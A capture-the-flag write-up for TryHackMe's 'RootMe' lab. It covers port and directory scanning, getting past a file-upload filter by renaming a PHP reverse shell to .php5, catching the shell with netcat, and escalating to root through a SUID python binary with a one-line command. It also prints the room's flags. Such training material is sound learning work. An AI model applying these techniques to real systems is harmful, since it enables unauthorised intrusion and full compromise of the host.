---
description: https://tryhackme.com/room/rrootme
---

# RootMe

## Reconnaissance

```
(kali㉿kali)-[~/Desktop] $ sudo nmap -sV 10.10.192.126 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 23:16 EDT Nmap scan report for 10.10.192.126 
Host is up (2.4s latency). 
Not shown: 998 closed tcp ports (reset) 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see **port 80** is open, so we can try to enumerate some web directories using gobuster.

<pre><code>(kali㉿kali)-[~/Desktop] $ gobuster dir -u http://10.10.192.126 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
<strong>===============================================================
</strong>Gobuster v3.5
by OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.192.126
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/21 23:25:23 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://10.10.192.126/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.192.126/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.192.126/js/]
/panel                (Status: 200) [Size: ???] [--> http://10.10.192.126/panel/] &#x3C;- Looks suspicious
</code></pre>

## Getting a Shell

Accessing the /panel directory of the machine's webserver leads us to a file upload page.

As the devious person I am, I tried to upload pentestmonkey's php reverse shell script to listen on port 4444 but this server has an upload filtering for .php files.&#x20;

I managed to bypass this filter by renaming my reverse shell file to a .php5 extension. After the upload was a success, the page even had a button to directly run my recently uploaded script!

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4444           
listening on [any] 4444 ...
connect to [10.18.41.182] from (UNKNOWN) [10.10.192.126] 36120
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:38:01 up 23 min,  0 users,  load average: 0.00, 0.05, 0.33
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ ls -la
ls -la
total 2097256
drwxr-xr-x  24 root root       4096 Aug  4  2020 .
drwxr-xr-x  24 root root       4096 Aug  4  2020 ..
drwxr-xr-x   2 root root       4096 Aug  4  2020 bin
drwxr-xr-x   3 root root       4096 Aug  4  2020 boot
drwxr-xr-x   2 root root       4096 Aug  4  2020 cdrom
drwxr-xr-x  17 root root       3700 Jun 22 03:15 dev
drwxr-xr-x  96 root root       4096 Aug  4  2020 etc
drwxr-xr-x   4 root root       4096 Aug  4  2020 home
lrwxrwxrwx   1 root root         34 Aug  4  2020 initrd.img -> boot/initrd.img-4.15.0-112-generic
lrwxrwxrwx   1 root root         34 Aug  4  2020 initrd.img.old -> boot/initrd.img-4.15.0-112-generic
drwxr-xr-x  22 root root       4096 Aug  4  2020 lib
drwxr-xr-x   2 root root       4096 Aug  4  2020 lib64
drwx------   2 root root      16384 Aug  4  2020 lost+found
drwxr-xr-x   2 root root       4096 Feb  3  2020 media
drwxr-xr-x   2 root root       4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root       4096 Feb  3  2020 opt
dr-xr-xr-x 107 root root          0 Jun 22 03:14 proc
drwx------   6 root root       4096 Aug  4  2020 root
drwxr-xr-x  26 root root        860 Jun 22 03:20 run
drwxr-xr-x   2 root root      12288 Aug  4  2020 sbin
drwxr-xr-x   4 root root       4096 Aug  4  2020 snap
drwxr-xr-x   2 root root       4096 Feb  3  2020 srv
-rw-------   1 root root 2147483648 Aug  4  2020 swap.img
dr-xr-xr-x  13 root root          0 Jun 22 03:14 sys
drwxrwxrwt   2 root root       4096 Jun 22 03:37 tmp
drwxr-xr-x  10 root root       4096 Feb  3  2020 usr
drwxr-xr-x  14 root root       4096 Aug  4  2020 var
lrwxrwxrwx   1 root root         31 Aug  4  2020 vmlinuz -> boot/vmlinuz-4.15.0-112-generic
lrwxrwxrwx   1 root root         31 Aug  4  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-112-generic

```

My usual routine after getting a web shell is spawning an interactive TTY using python.

After getting my interactive TTY, I tried to list some information about the directories & files within the target machine. We were tasked to look for a flag within our current powers, and so we looked.&#x20;

```
$ ls
ls
html  user.txt
$ cat user.txt
cat user.txt
THM{y0u_g0t_a_sh3ll}
```

## Privilege Escalation

One common angle of escalating privileges in Linux machines is looking for exectuables with the SUID bit set.

```
$ find / -user root -perm /4000
find / -user root -perm /4000
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount

```

I noticed that there is a weird entry of `/usr/bin/python`, to which I used a technique from GTFOBins that leverages the python binary to gain root privileges.

```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
# ls     
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
# cd root
cd root
# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

```
Done and dusted!
```
